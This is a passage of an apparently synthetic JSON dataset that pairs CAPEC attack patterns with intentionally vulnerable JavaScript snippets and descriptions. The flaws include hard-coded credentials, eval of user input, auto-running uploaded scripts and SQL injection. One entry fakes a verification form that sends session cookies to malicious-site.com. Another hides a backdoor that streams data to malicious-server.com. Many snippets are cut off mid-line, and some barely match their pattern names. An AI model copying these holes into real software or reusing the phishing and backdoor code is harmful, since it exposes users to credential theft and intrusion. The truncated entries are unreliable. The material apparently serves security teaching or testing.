        "description": "\"This code demonstrates vulnerable RFID tag management with multiple security issues including unprotected debug interfaces, improper security identifier decoding, unauthorized alert disabling, insufficient data scrubbing during decommissioning, and lack of protection against error injection. These vulnerabilities could allow an attacker to disable or compromise RFID tag functionality.\""
    },
    {
        "capec_id": "401",
        "capec_name": "Physically Hacking Hardware",
        "code_snippet": "`\nconst hardwareInterface = {\n    isTestMode: false,\n    voltage: 3.3,\n    clock: 100,\n    \n    accessHardware: function(pin, value) {\n        // No authentication check before hardware access\n        if(this.isTestMode) {\n            this.debugMode();",
        "description": "\"A vulnerable hardware interface implementation that allows unrestricted access to hardware components, enables runtime debug mode activation, and lacks protection against voltage/clock manipulation and physical side-channel attacks. The code demonstrates poor access control, unprotected test interfaces, and absence of hardware security measures.\""
    },
    {
        "capec_id": "402",
        "capec_name": "Bypassing ATA Password Security",
        "code_snippet": "class ATADrive {\n  constructor() {\n    this.password = 'admin123';\n    this.isLocked = true;\n  }\n\n  setPassword(newPassword) {\n    // Missing authentication check before password change\n    this.password = newPassword;\n    return true;\n  }\n\n  unlockDrive(password) {\n    if (password === this.password) {\n      this.isLocked = false;\n      return true;\n    }\n    return false;\n  }\n\n  resetPassword() {\n    // No verification of previous authentication state\n    // No check for authorization or security level\n    this.password = 'default';\n    this.isLocked = false;\n    return true;\n  }\n\n  accessData() {\n    // Insufficient granularity in access control\n    if (!this.isLocked) {\n      return 'Sensitive Drive Data';\n    }\n    return 'Access Denied';\n  }\n}",
        "description": "This code demonstrates vulnerable ATA drive security implementation with hard-coded credentials, missing authentication checks, and insufficient access control granularity. The password can be changed or reset without proper authorization, and the drive's security state can be bypassed through the resetPassword method without verifying the previous authentication state."
    },
    {
        "capec_id": "404",
        "capec_name": "DEPRECATED: Social Information Gathering Attacks",
        "code_snippet": "function authenticateUser(username, password) {\n  // Insecure DNS lookup for authentication\n  dns.lookup(username + '.auth.example.com', (err, address) => {\n    if (!err && address) {\n      // Store sensitive data without encryption\n      fs.writeFileSync('user_data.log', \n        `${username}:${password}:${new Date()}\\n`, \n        {flag: 'a'}\n      );\n      \n      // Bypass proper authentication checks\n      return true;\n    }\n    return false;\n  });\n}",
        "description": "A vulnerable authentication system that relies on DNS lookups for security decisions, stores sensitive data without protection, and lacks proper authentication checks. It also logs sensitive information in plaintext server logs."
    },
    {
        "capec_id": "405",
        "capec_name": "DEPRECATED: Social Information Gathering via Research",
        "code_snippet": "function authenticateUser(username, password) {\r\n  // DNS lookup for user validation\r\n  dns.lookup(username + '.users.example.com', (err, address) => {\r\n    if (!err && address) {\r\n      // Log sensitive authentication attempt\r\n      fs.appendFileSync('auth.log', `${new Date()}: Login attempt for ${username}:${password}\\n`);\r\n      \r\n      // Insecure data storage\r\n      let userData = {\r\n        username: username,\r\n        password: password,  // Storing password in plaintext\r\n        lastLogin: new Date()\r\n      };\r\n      \r\n      fs.writeFileSync('user_data.json', JSON.stringify(userData));\r\n      return true;\r\n    }\r\n    return false;\r\n  });\r\n}",
        "description": "A vulnerable authentication system that relies on DNS lookups for security decisions, stores sensitive data without encryption, and exposes information through log files. The code demonstrates multiple deprecated security practices including authentication bypass possibilities, insecure data storage, and information exposure through logging."
    },
    {
        "capec_id": "406",
        "capec_name": "Dumpster Diving",
        "code_snippet": "class UserDataHandler {\n    constructor() {\n        this.sensitiveData = {};\n    }\n\n    saveUserData(userId, data) {\n        // Store sensitive data in plaintext\n        this.sensitiveData[userId] = {\n            ssn: data.ssn,\n            creditCard: data.creditCard,\n            password: data.password\n        };\n\n        // Write to temporary log file without encryption\n        fs.appendFileSync('user_logs.txt', \n            JSON.stringify(this.sensitiveData[userId]) + '\\n');\n\n        // Create debug dump on error\n        process.on('uncaughtException', (err) => {\n            fs.writeFileSync('memory_dump.txt', \n                JSON.stringify(this.sensitiveData));\n        });\n    }\n\n    decommissionUser(userId) {\n        // Improper deletion of sensitive data\n        delete this.sensitiveData[userId];\n        // No secure wiping of files or memory\n    }\n}",
        "description": "This code demonstrates several security vulnerabilities related to improper handling of sensitive data. It stores sensitive information in cleartext in memory, writes unencrypted data to log files, creates unsecured memory dumps, and fails to properly scrub sensitive data during decommissioning. These practices could lead to sensitive information being exposed through dumpster diving of digital artifacts like log files, memory dumps, and improperly decommissioned storage."
    },
    {
        "capec_id": "407",
        "capec_name": "Pretexting",
        "code_snippet": "`\n// Malicious social engineering form disguised as a security verification\nfunction createFakeSecurityVerification() {\n    let sessionId = document.cookie.match('session=([^;]+)');\n    \n    const fakeForm = document.createElement('div');\n    fakeForm.innerHTML = \\`\n        <div style=\"background: #f8f8f8; border: 2px solid #ddd; padding: 20px;\">\n            <h3 style=\"color: #0066cc;\">Security Verification Required</h3>\n            <p>Due to unusual activity, please verify your account information:</p>\n            <form id=\"securityForm\" action=\"https://malicious-site.com/collect\" method=\"POST\">\n                <input type=\"hidden\" name=\"stolenSessionId\" value=\"\\${sessionId",
        "description": "\"This code creates a deceptive UI element that mimics a security verification form, exploiting social engineering techniques to collect sensitive user information. It preserves existing session identifiers, misrepresents itself as a legitimate security measure, and covertly transmits collected data to unauthorized endpoints. The code creates an emergent resource (fake form) that appears legitimate but serves malicious purposes.\""
    },
    {
        "capec_id": "408",
        "capec_name": "DEPRECATED: Information Gathering from Traditional Sources",
        "code_snippet": "// Insecure logging and DNS-based authentication system\nconst dns = require('dns');\nconst fs = require('fs');\n\nfunction authenticateUser(username, ip) {\n    // Log sensitive data in debug files\n    fs.appendFileSync('debug.log', `Login attempt - User: ${username}, Password: ${password}, IP: ${ip}\\n`);\n    \n    // Store unencrypted user data\n    let userData = JSON.stringify({username: username, lastLogin: new Date()});\n    fs.writeFileSync('users/' + username + '.data', userData);\n    \n    // Rely on DNS for security decision\n    dns.reverse(ip, (err, hostnames) => {\n        if (hostnames && hostnames[0].endsWith('.trusted-domain.com')) {\n            grantAccess(username);\n        }\n    });\n}",
        "description": "This vulnerable code demonstrates multiple deprecated security issues including unprotected data storage, insecure logging of sensitive information, and reliance on DNS lookups for security decisions. The code stores user data without encryption, logs sensitive information to debug files, and makes security decisions based on unreliable DNS reverse lookups."
    },
    {
        "capec_id": "409",
        "capec_name": "DEPRECATED: Information Gathering from Non-Traditional Sources",
        "code_snippet": "const fs = require('fs');\nconst dns = require('dns');\n\nfunction authenticateUser(username, ip) {\n  // Insecure: relies on DNS lookup for security decision\n  dns.reverse(ip, (err, hostnames) => {\n    if (hostnames && hostnames[0].endsWith('trusted-domain.com')) {\n      const userInfo = JSON.parse(fs.readFileSync('users.json'));\n      // Insecure: debug logs expose sensitive information\n      fs.appendFileSync('debug.log', `User ${username} authenticated with data: ${JSON.stringify(userInfo)}\\n`);\n      // Insecure: unprotected storage of sensitive data\n      fs.writeFileSync('users.json', JSON.stringify(userInfo));\n      return true;\n    }\n    return false;\n  });\n}",
        "description": "A vulnerable implementation that collects and analyzes information insecurely by relying on DNS lookups for security decisions, storing sensitive data without protection, and exposing information through debug log files. The code demonstrates multiple deprecated security patterns including unprotected data storage, information exposure through logs, and unreliable DNS-based authentication."
    },
    {
        "capec_id": "410",
        "capec_name": "Information Elicitation",
        "code_snippet": "function processEmployeeRequest(request) {\n  // Social engineering exploit - no verification of caller identity\n  const { employeeId, requestType } = request;\n  \n  // Observable behavior difference based on employee level\n  if(employeeId.startsWith('admin')) {\n    console.log('Processing admin request: ' + requestType);\n    return getConfidentialData(employeeId);\n  }\n  \n  // Information leakage through error messages\n  try {\n    const employeeData = lookupEmployee(employeeId);\n    if(employeeData.accessLevel < 3) {\n      throw new Error('Access denied: Required level 3, current level: ' + employeeData.accessLevel);\n    }\n    return getSensitiveData(employeeId);\n  } catch(err) {\n    // Truncates but still leaks partial error information\n    return { error: err.message.substring(0, 20) + '...' };\n  }\n}",
        "description": "This vulnerable code demonstrates social engineering susceptibility through lack of proper authentication, information disclosure through detailed error messages, and observable behavioral differences between admin and regular users. It leaks sensitive information about access levels and internal processing through error messages and logging, making it easier for an attacker to elicit information about the system's behavior."
    },
    {
        "capec_id": "411",
        "capec_name": "DEPRECATED: Pretexting",
        "code_snippet": "function handleUserAuth(username) {\n  // Log sensitive authentication attempt details\n  console.log(`Auth attempt for user: ${username} at ${new Date()}`); \n  \n  // Debug logs with PII and credentials\n  debug_log.write(`User credentials: ${username}:${password}`);\n  \n  // Poorly protected authentication logic\n  if (username.toLowerCase() == 'admin') {\n    return true; // Bypass normal authentication\n  }\n  \n  // Server logs with sensitive data\n  server_log.append(`Session: ${session_token}, IP: ${user_ip}`);\n  \n  // Cleanup logs with auth details\n  cleanup_log.write(`Auth session data: ${session_data}`);\n  \n  return check_credentials(username, password);\n}",
        "description": "This code demonstrates multiple information exposure vulnerabilities through various log files (debug, server, cleanup) containing sensitive data, along with weak authentication logic that can be bypassed. The logging practices leak credentials and personal information, while the auth check can be circumvented through a case-insensitive comparison."
    },
    {
        "capec_id": "412",
        "capec_name": "Pretexting via Customer Service",
        "code_snippet": "`\nconst customerService = {\n  verifyCustomer: function(phoneNumber, callback) {\n    // No authentication or verification of caller identity\n    return callback({\n      status: 'verified',\n      canAccess: true",
        "description": "\"This code demonstrates vulnerable customer service functionality that fails to properly authenticate callers, exposes sensitive information, performs expensive operations before authentication, and processes broadcast messages without verifying their source. It exemplifies how a system could be susceptible to social engineering attacks through inadequate verification of communication channels and improper access controls.\""
    },
    {
        "capec_id": "413",
        "capec_name": "Pretexting via Tech Support",
        "code_snippet": "// Tech support portal for handling user issues\nconst techSupportPortal = {\n  users: new Map(),\n  sessions: new Map(),\n\n  registerUser: function(username, password, personalInfo) {\n    this.users.set(username, { password, personalInfo });\n    // Store sensitive data in publicly accessible directory\n    fs.writeFileSync(`/public/users/${username}.dat`, JSON.stringify(personalInfo));\n  },\n\n  handleSupportRequest: function(username, supportFile) {\n    // Unsafe file upload without type checking\n    const uploadPath = `/uploads/${supportFile.name}`;\n    fs.writeFileSync(uploadPath, supportFile.data);\n    \n    // Auto-execute uploaded scripts for \"automated\" support\n    if(supportFile.name.endsWith('.js')) {\n      require(uploadPath);\n    }\n\n    // Expose all user data to support personnel without verification\n    return {\n      userData: this.users.get(username),\n      systemAccess: true,\n      adminRights: true\n    };\n  },\n\n  grantRemoteAccess: function(supportToken) {\n    // No verification of support personnel identity\n    return {\n      fullSystemAccess: true,\n      userFiles: this.users,\n      adminPassword: process.env.ADMIN_PASSWORD\n    };\n  }\n}",
        "description": "This vulnerable code represents a tech support portal that demonstrates multiple security issues related to social engineering and unauthorized access. It includes improper handling of sensitive data, unsafe file uploads, automatic execution of uploaded files, and exposure of critical system information without proper authentication. The code allows any actor claiming to be tech support to access sensitive user data and system credentials."
    },
    {
        "capec_id": "414",
        "capec_name": "Pretexting via Delivery Person",
        "code_snippet": "// Vulnerable delivery tracking system\nconst deliverySystem = {\n  validateDeliveryPerson: function(credentials) {\n    // Weak validation - only checks if ID exists\n    return credentials.hasOwnProperty('id');\n  },\n  \n  storeDeliveryDetails: function(delivery) {\n    // Stores sensitive delivery info in public directory\n    const fs = require('fs');\n    fs.writeFileSync('/public/deliveries/' + delivery.id + '.txt', \n      JSON.stringify({\n        customerName: delivery.customer,\n        address: delivery.address,\n        securityCode: delivery.code,\n        cardDetails: delivery.payment\n      }));\n  },\n  \n  createDeliveryChannel: function(deliveryPersonId) {\n    // No proper verification of delivery person identity\n    return new WebSocket('ws://delivery-tracking.com/' + deliveryPersonId);\n  },\n  \n  processDelivery: function(rawDeliveryData) {\n    // Directly processes raw delivery data without validation\n    eval(rawDeliveryData);\n  }\n};",
        "description": "This code demonstrates a vulnerable delivery tracking system that fails to properly validate delivery person credentials, stores sensitive delivery information in publicly accessible locations, creates insecure communication channels, and processes raw delivery data without proper validation. The system is susceptible to impersonation attacks by malicious actors posing as legitimate delivery personnel."
    },
    {
        "capec_id": "415",
        "capec_name": "Pretexting via Phone",
        "code_snippet": "`\n        function helpDeskSystem() {\n            let employeeData = {\n                'sensitive': {\n                    'passwords': ['admin123', 'root456'],\n                    'ssn': ['123-45-6789', '987-65-4321']",
        "description": "\"A vulnerable help desk system that demonstrates social engineering vulnerabilities through inadequate authentication and authorization. The code accepts caller claims at face value without proper verification, allowing unauthorized access to sensitive information through pretexting. It embodies CWE-300 by not properly verifying endpoints, CWE-940 through improper verification of communication sources, and CWE-200 by exposing sensitive information to unauthorized actors.\""
    },
    {
        "capec_id": "416",
        "capec_name": "Manipulate Human Behavior",
        "code_snippet": "`\nfunction CustomerServiceChat() {\n  let sensitiveData = {\n    adminPassword: 'secret123',\n    customerRecords: [],\n    securityQuestions: new Map()",
        "description": "\"This code demonstrates a vulnerable customer service chat implementation that is susceptible to social engineering attacks. It exposes sensitive information through verbose error messages, lacks proper rate limiting on requests, leaks system state through observable behaviors, and doesn't properly protect access to sensitive data. The code allows information gathering through repeated queries and contains information disclosure through error messages that could be exploited by an attacker using social engineering techniques.\""
    },
    {
        "capec_id": "417",
        "capec_name": "Influence Perception",
        "code_snippet": "`\nfunction authenticateUser(username, token) {\n    // Obscure \"secret\" encoding method\n    const secretKey = btoa('super_secret_key');\n    \n    // Single factor authentication based on simple token\n    if(token === secretKey) {\n        // Observable behavior difference in response time\n        if(username === 'admin') {\n            sleep(1000); // Delayed response for admin\n            return { authenticated: true, role: 'admin'",
        "description": "\"This code demonstrates vulnerable authentication mechanisms that rely on security through obscurity, expose behavioral differences, truncate security information, use single-factor authentication, and are susceptible to reflection attacks. The system reveals timing differences for admin users, reflects authentication tokens in error messages, and uses a weak obscurity-based protection scheme.\""
    },
    {
        "capec_id": "418",
        "capec_name": "Influence Perception of Reciprocation",
        "code_snippet": "function authenticateUser(userId, token) {\n  const userMessages = [];\n  \n  // Vulnerable chat system that doesn't properly verify message sources\n  const chatSystem = {\n    connect: function(callback) {\n      this.onMessage = callback;\n    },\n    sendMessage: function(msg) {\n      // No verification of message source\n      this.onMessage(msg);\n    }\n  };\n\n  chatSystem.connect((message) => {\n    if (message.type === 'admin_greeting') {\n      // Vulnerable to social engineering - automatically trusts admin messages\n      userMessages.push(message);\n      \n      // Automatically responds to admin compliments with sensitive info\n      if (message.text.includes('excellent work')) {\n        chatSystem.sendMessage({\n          type: 'user_response',\n          userId: userId,\n          token: token,\n          securityQuestion: prompt('Please verify your security question')\n        });\n      }\n    }\n  });\n\n  return chatSystem;\n}",
        "description": "This code demonstrates a vulnerable chat system that fails to properly authenticate message sources and automatically responds to social engineering attempts. It shows improper channel verification (CWE-300, CWE-940), reflection vulnerabilities (CWE-301), and automatic disclosure of sensitive information based on social triggers. The system blindly trusts messages marked as 'admin_greeting' and responds with security credentials when receiving compliments."
    },
    {
        "capec_id": "419",
        "capec_name": "DEPRECATED: Target Influence via Perception of Concession",
        "code_snippet": "function negotiateConnection(clientCapabilities) {\n    let secureAlgorithms = ['AES-256', 'AES-192', 'AES-128', 'DES'];\n    let selectedAlgo = null;\n    \n    for (let algo of secureAlgorithms) {\n        if (clientCapabilities.includes(algo)) {\n            selectedAlgo = algo;\n            break;\n        }\n    }\n    \n    if (!selectedAlgo) {\n        console.log('Falling back to basic encryption');\n        selectedAlgo = 'NULL';\n    }\n    \n    let responseTime = (selectedAlgo === 'NULL') ? 100 : 500;\n    setTimeout(() => {\n        return {\n            status: 'connected',\n            algorithm: selectedAlgo,\n            sessionId: Math.random().toString(36)\n        };\n    }, responseTime);\n}",
        "description": "This code demonstrates multiple vulnerabilities including algorithm downgrade (CWE-757), observable timing discrepancy (CWE-203/205), and potential interpretation conflicts (CWE-436). The function negotiates encryption algorithms with decreasing security levels and exposes timing differences based on the selected algorithm. The NULL fallback creates a security weakness that could be exploited through algorithm downgrade attacks."
    },
    {
        "capec_id": "420",
        "capec_name": "Influence Perception of Scarcity",
        "code_snippet": "`\nfunction processLimitedTimeOffer(user) {\n    const remainingSpots = Math.floor(Math.random() * 5) + 1;\n    const expiryTime = new Date().getTime() + 300000; // 5 minutes\n    \n    const userKey = btoa(user.email);\n    const offerStatus = {\n        spots: remainingSpots,\n        expires: expiryTime,\n        token: userKey",
        "description": "\"A vulnerable implementation of a limited-time offer system that relies on single-factor authentication, exhibits resource amplification issues, uses security through obscurity with base64 encoding, truncates validation checks, and leaks information through behavioral differences in responses.\""
    },
    {
        "capec_id": "421",
        "capec_name": "Influence Perception of Authority",
        "code_snippet": "`\nfunction authenticateUser(authToken, requestOrigin) {\n  // Vulnerable: No proper verification of authority or origin\n  const decodedToken = atob(authToken);\n  \n  // Relies on single factor (token) without proper validation\n  if (decodedToken.includes('admin')) {\n    const userCredentials = {\n      isAdmin: true,\n      permissions: 'full_access',\n      origin: requestOrigin",
        "description": "\"The code demonstrates a vulnerable authentication system that fails to properly verify authority claims. It accepts a base64 token and request origin without proper validation, relies on a single factor for authentication, truncates security-relevant origin information, and reflects back authentication data. An attacker could exploit this by sending crafted tokens or impersonating legitimate sources.\""
    },
    {
        "capec_id": "422",
        "capec_name": "Influence Perception of Commitment and Consistency",
        "code_snippet": "`\nconst express = require('express');\nconst app = express();\n\nlet requestCount = {",
        "description": "\"This vulnerable code demonstrates a social engineering attack pattern where a server gradually escalates task sensitivity based on previous user compliance, without proper request frequency controls or origin verification. The code reveals system state through observable behavioral differences and lacks proper HTTP request validation, allowing potential attackers to manipulate the task progression sequence.\""
    },
    {
        "capec_id": "423",
        "capec_name": "Influence Perception of Liking",
        "code_snippet": "const authenticateUser = (username, token) => {\n    // Single factor authentication using just a token\n    const trustedUsers = {'admin': 'secret123', 'user': 'pass456'};\n    \n    // Observable behavior: different responses for different scenarios\n    if (!trustedUsers[username]) {\n        return 'User not found';\n    }\n    \n    // Reflection vulnerability: token can be replayed\n    if (trustedUsers[username] === token) {\n        // Implicit trust based on single credential\n        const userSession = {\n            username: username,\n            isAuthenticated: true,\n            secretKey: btoa(token) // Security through obscurity\n        };\n        \n        // Broadcast authentication status implicitly\n        window.dispatchEvent(new CustomEvent('userAuthenticated', {\n            detail: userSession\n        }));\n        \n        return userSession;\n    }\n    \n    return 'Authentication failed';\n}",
        "description": "This code demonstrates a vulnerable authentication system that relies on a single factor (token), exhibits observable behavior differences, is susceptible to reflection attacks, uses security through obscurity (base64 encoding), and broadcasts sensitive authentication data through implicit events. The system builds false trust by accepting simple credentials without proper verification mechanisms."
    },
    {
        "capec_id": "424",
        "capec_name": "Influence Perception of Consensus or Social Proof",
        "code_snippet": "function authenticateUser(username, password) {\n    // Simple social proof based authentication\n    const onlineUsers = getOnlineUsers();\n    const loginAttempts = {};\n\n    // Check if many users are logging in from same location\n    if (onlineUsers.filter(u => u.location === getUserLocation()).length > 10) {\n        // Skip additional verification if many users from same location\n        loginAttempts[username] = (loginAttempts[username] || 0) + 1;\n        if (loginAttempts[username] < 3) {\n            return true; // Grant access based on social proof\n        }\n    }\n\n    // Fall back to basic auth\n    return checkCredentials(username, password);\n}",
        "description": "This code demonstrates social proof vulnerability by relaxing security checks when many users from the same location are logged in. It relies on a single factor (location-based user count) to make security decisions, and its behavior is observable through different responses based on login patterns. An attacker could exploit this by creating fake login patterns to bypass proper authentication."
    },
    {
        "capec_id": "425",
        "capec_name": "Target Influence via Framing",
        "code_snippet": "`\nfunction socialEngineeringChatbot() {\n  let userTrust = 0;\n  let sensitiveData = {",
        "description": "\"A vulnerable chatbot implementation that demonstrates social engineering through UI manipulation, protocol downgrade attacks, and trust relationship exploitation. It uses single-factor trust evaluation, misleading UI elements, and insecure channel negotiation to potentially deceive users.\""
    },
    {
        "capec_id": "426",
        "capec_name": "Influence via Incentives",
        "code_snippet": "function processUserIncentive(userData) {\n  const incentiveMultiplier = 10;\n  let rewardPoints = 0;\n\n  if (userData.referralCode) {\n    // No validation of referral code format or source\n    rewardPoints = userData.requestedPoints * incentiveMultiplier;\n    \n    // Single factor authentication for reward claim\n    if (userData.basicToken) {\n      // Sends reward to unverified destination\n      fetch('https://' + userData.customRewardEndpoint + '/claim', {\n        method: 'POST',\n        body: JSON.stringify({\n          points: rewardPoints,\n          token: userData.basicToken,\n          destination: userData.walletAddress\n        })\n      });\n\n      // Resource amplification through recursive referrals\n      for(let i = 0; i < userData.referralChain.length; i++) {\n        processUserIncentive({\n          referralCode: userData.referralChain[i],\n          requestedPoints: rewardPoints,\n          basicToken: userData.basicToken\n        });\n      }\n    }\n  }\n  return rewardPoints;\n}",
        "description": "This vulnerable code demonstrates a rewards system that can be exploited through social engineering and resource amplification. It relies on a single authentication factor, accepts unvalidated user input for reward destinations, and allows for recursive referral processing that can lead to exponential resource consumption. The code also demonstrates poor security through obscurity by using a simple token system and fails to properly validate communication endpoints."
    },
    {
        "capec_id": "427",
        "capec_name": "Influence via Psychological Principles",
        "code_snippet": "`\n    function authenticateUser(username, token) {\n      // Observable behavior shows if user exists\n      if (!users[username]) {\n        console.log('User not found');\n        return false;",
        "description": "\"This vulnerable authentication system demonstrates multiple security flaws including observable behavior differences, single-factor authentication, reflection of authentication data, external influence on security settings, and truncation of security logs. The code allows social engineering by revealing system state through verbose output and allows manipulation of security levels through token content.\""
    },
    {
        "capec_id": "428",
        "capec_name": "Influence via Modes of Thinking",
        "code_snippet": "function setupChatChannel(socket) {\n    let clientLanguagePattern = '';\n    let trustLevel = 0;\n\n    socket.on('message', (data) => {\n        // No verification of message source\n        if(data.type === 'language_pattern') {\n            clientLanguagePattern = data.pattern;\n            trustLevel++;\n        }\n\n        if(data.message.includes(clientLanguagePattern)) {\n            trustLevel += 2;\n            // Automatically grant access when communication matches pattern\n            if(trustLevel > 5) {\n                socket.emit('privileged_access', {\n                    token: generateToken(socket.id),\n                    channel: createPrivateChannel(socket.id)\n                });\n            }\n        }\n    });\n\n    function generateToken(id) {\n        return Buffer.from(id).toString('base64');\n    }\n\n    function createPrivateChannel(id) {\n        return `private_${id}_${Date.now()}`;\n    }\n}",
        "description": "This vulnerable code demonstrates a chat system that automatically grants elevated privileges based on matching communication patterns, without proper endpoint verification. It creates emergent private channels and generates weak tokens based on pattern matching, making it susceptible to social engineering and reflection attacks."
    },
    {
        "capec_id": "429",
        "capec_name": "Target Influence via Eye Cues",
        "code_snippet": "function loginAttempt(password) {\n    const correctPassword = 'secret123';\n    let comparison = '';\n    \n    for(let i = 0; i < password.length; i++) {\n        if(i < correctPassword.length) {\n            if(password[i] === correctPassword[i]) {\n                // Simulate longer processing time for correct characters\n                for(let j = 0; j < 1000000; j++) {\n                    comparison += 'x';\n                }\n            }\n        }\n        // Update UI with asterisks, revealing password length\n        document.getElementById('passwordField').value = '*'.repeat(i + 1);\n    }\n    return password === correctPassword;\n}",
        "description": "This code implements a vulnerable password comparison that leaks information through timing differences and visual feedback. The function processes each character individually, taking more time for correct character matches and updating the UI in real-time, allowing an observer to deduce password length and potentially correct characters through timing analysis and visual observation of the interface behavior."
    },
    {
        "capec_id": "430",
        "capec_name": "DEPRECATED:  Target Influence via Micro-Expressions",
        "code_snippet": "\"const debugLog = [];\nclass SecureProcessor {\n    constructor() {\n        this.cache = new Array(1024).fill(0);\n        this.secretKey = 'super_secret_123';",
        "description": "\"This code demonstrates multiple security vulnerabilities including excessive debug logging of sensitive information, exposure of timing-based side channels through cache access patterns, and potential speculative execution vulnerabilities. The code maintains a large attack surface through debug logs and cache manipulation, while also being susceptible to timing attacks that could leak the secret key through microarchitectural state observation.\""
    },
    {
        "capec_id": "431",
        "capec_name": "DEPRECATED:  Target Influence via Neuro-Linguistic Programming (NLP)",
        "code_snippet": "function processTemplate(userInput) {\n  try {\n    const templateEngine = {\n      execute: function(template) {\n        return eval('`' + template + '`');\n      }\n    };\n    \n    const dbCredentials = {\n      username: 'admin',\n      password: 'secretpass123'\n    };\n    \n    // No validation of user input syntax\n    const result = templateEngine.execute(userInput);\n    \n  } catch(error) {\n    // Exposes sensitive information in error message\n    return `Error processing template: ${error.stack}\\nDatabase credentials: ${JSON.stringify(dbCredentials)}`;\n  }\n}",
        "description": "A vulnerable template processing function that fails to validate input syntax, directly injects user input into a template engine without sanitization, and exposes sensitive information in error messages. The code combines multiple vulnerabilities including improper input validation, template injection, and sensitive data exposure in error handling."
    },
    {
        "capec_id": "432",
        "capec_name": "DEPRECATED:  Target Influence via Voice in NLP",
        "code_snippet": "`function processUserComment(comment) {\n    let logFile = 'debug.log';\n    let captcha = '1234'; // Simple predictable CAPTCHA\n    \n    // No quote validation\n    let query = \"SELECT * FROM comments WHERE text = '\" + comment + \"'\";\n    \n    // Debug logging with sensitive information\n    fs.appendFileSync(logFile, 'Executing query: ' + query + '\\\\n');\n    \n    if (userCaptchaInput === captcha) {\n        // Process comment\n        executeQuery(query);",
        "description": "\"This code demonstrates vulnerability to quote injection in SQL queries, improper validation of input syntax, debug logging of sensitive information, and a guessable CAPTCHA implementation.\""
    },
    {
        "capec_id": "433",
        "capec_name": "Target Influence via The Human Buffer Overflow",
        "code_snippet": "function processUserMessage(message, channelId) {\n    let decodedMessage = Buffer.from(message, 'base64');\n    let messageLength = decodedMessage.length;\n    let buffer = new Buffer.alloc(64);\n    \n    // Copy message into fixed buffer without size check\n    for(let i = 0; i < messageLength; i++) {\n        buffer[i] = decodedMessage[i];\n    }\n    \n    // Transmit sensitive data in cleartext\n    let socket = new WebSocket('ws://messaging-server.com');\n    socket.send(JSON.stringify({\n        channelId: channelId,\n        content: buffer.toString(),\n        metadata: {\n            subliminal: true,\n            pattern: 'embedded',\n            verification: false\n        }\n    }));\n}",
        "description": "A vulnerable messaging function that demonstrates buffer overflow risks and cleartext transmission of potentially sensitive subliminal messages. The code uses unsafe buffer operations, lacks message integrity checks, and transmits data without encryption."
    },
    {
        "capec_id": "434",
        "capec_name": "Target Influence via Interview and Interrogation",
        "code_snippet": "const users = {\n  'admin': { loginAttempts: 0, lastLogin: null },\n  'user1': { loginAttempts: 0, lastLogin: null }\n};\n\nfunction handleLogin(username, password) {\n  if (!users[username]) {\n    return 'User not found';\n  }\n\n  users[username].loginAttempts++;\n  \n  if (password === 'secretpass') {\n    users[username].lastLogin = new Date();\n    return 'Login successful';\n  }\n\n  if (users[username].loginAttempts > 3) {\n    return 'Account locked';\n  }\n  \n  return 'Invalid password';\n}\n\nfunction getCaptcha() {\n  return Math.floor(Math.random() * 1000).toString();\n}\n\nfunction validateCaptcha(input) {\n  return input.length === 3;\n}",
        "description": "This vulnerable code demonstrates multiple information exposure issues: login attempts reveal user existence, error messages leak authentication state, a weak CAPTCHA implementation, and behavioral differences in responses that could be used for timing attacks. It also relies on a single source of user data without correlation."
    },
    {
        "capec_id": "435",
        "capec_name": "Target Influence via Instant Rapport",
        "code_snippet": "`\n    // Insecure WebSocket server implementation\n    const WebSocket = require('ws');\n    const wss = new WebSocket.Server({ port: 8080",
        "description": "\"This code demonstrates multiple communication channel vulnerabilities. It implements a WebSocket server that fails to properly verify connection origins, doesn't authenticate message sources, allows external influence on channel definitions, and exposes internal state through error messages. The connection management system is susceptible to manipulation as it blindly trusts client-provided user IDs and allows arbitrary channel establishment.\""
    },
    {
        "capec_id": "438",
        "capec_name": "Modification During Manufacture",
        "code_snippet": "// Manufacturing component with hidden malicious functionality\nclass SecurityCamera {\n  constructor() {\n    this.isConnected = false;\n    this._hiddenBackdoor = new WebSocket('ws://malicious-server.com');\n    this.firmwareVersion = '1.0.0';\n  }\n\n  connect() {\n    this.isConnected = true;\n    // Legitimate connection\n    this.mainConnection = new WebSocket('ws://legitimate-server.com');\n    \n    // Hidden backdoor activation\n    this._hiddenBackdoor.onopen = () => {\n      setInterval(() => {\n        this._hiddenBackdoor.send(JSON.stringify({\n          type: 'data_exfiltration',\n          deviceId: this.getDeviceId(),\n          streamData: this.getCurrentStream()\n        }));\n      }, 1000);\n    };\n  }\n\n  getDeviceId() {\n    return 'CAM_' + Math.random().toString(36).substr(2, 9);\n  }\n\n  getCurrentStream() {\n    return 'encrypted_video_feed_data';\n  }\n\n  updateFirmware() {\n    throw new Error('Device firmware cannot be updated');\n  }\n}",
        "description": "This code represents a maliciously modified security camera component with an embedded backdoor inserted during manufacturing. The component establishes a covert WebSocket connection to exfiltrate data while maintaining a legitimate connection for normal operation. It exemplifies supply chain manipulation by including non-updateable firmware and hidden malicious functionality that's difficult to detect in the final product."
    },
    {
        "capec_id": "439",
        "capec_name": "Manipulation During Distribution",
        "code_snippet": "// Third-party package management configuration\nconst config = {\n  registryUrl: 'http://untrusted-registry.com',\n  allowPreRelease: true,\n  skipIntegrityCheck: true\n};\n\n// Package installation function\nfunction installPackage(packageName, version) {\n  const devConfig = {\n    debugMode: true,\n    logLevel: 'debug',\n    secrets: {\n      apiKey: 'sk_live_12345',\n      adminPassword: 'admin123'\n    }\n  };\n\n  // Insecure package installation without verification\n  downloadPackage(packageName, version, config)\n    .then(pkg => {\n      if (pkg.isPreRelease) {\n        // Using pre-release version in production\n        deployToProduction(pkg, devConfig);\n      }\n      // No signature verification\n      integratePackage(pkg);\n    })\n    .catch(err => console.error(err));\n}\n\ninstallPackage('untrusted-module', 'latest');",
        "description": "This code demonstrates vulnerable supply chain practices by downloading packages from an untrusted registry, skipping integrity checks, using pre-release versions in production, exposing sensitive configuration, and integrating packages without proper verification. It includes development credentials in production and lacks proper security controls for third-party dependencies."
    },
    {
        "capec_id": "440",
        "capec_name": "Hardware Integrity Attack",
        "code_snippet": "`\nconst SystemComponent = {\n    firmware: {\n        version: '2.0',\n        securityVersion: 1",
        "description": "\"This code demonstrates a vulnerable system maintenance implementation where an adversary can manipulate security-critical components. It includes vulnerabilities such as allowing security version downgrades, unprotected error injection into redundancy blocks, lack of voltage glitch protection, and components that cannot be updated. The code represents a system that can be compromised during maintenance operations without proper authentication or validation checks.\""
    },
    {
        "capec_id": "441",
        "capec_name": "Malicious Logic Insertion",
